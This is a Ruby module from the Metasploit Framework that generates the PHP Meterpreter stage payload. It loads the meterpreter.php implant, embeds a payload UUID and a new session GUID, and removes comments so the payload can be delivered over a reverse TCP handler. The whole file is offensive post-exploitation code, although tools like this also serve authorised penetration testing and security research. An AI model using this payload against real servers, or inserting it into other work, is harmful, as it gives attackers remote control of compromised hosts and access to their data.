##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_php'
require 'msf/base/sessions/meterpreter_options'
require 'securerandom'

module MetasploitModule

  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP Meterpreter',
      'Description'   => 'Run a meterpreter server in PHP',
      'Author'        => ['egypt'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
  end

  def generate_stage(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')

    uuid = opts[:uuid] || generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")

    # Staged payloads need to have a new session GUID
    session_guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*').chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub(%q|"SESSION_GUID", ""|, %Q|"SESSION_GUID", "#{session_guid}"|)

    met.gsub!(/#.*?$/, '')
    #met = Rex::Text.compress(met)
    met
  end
end
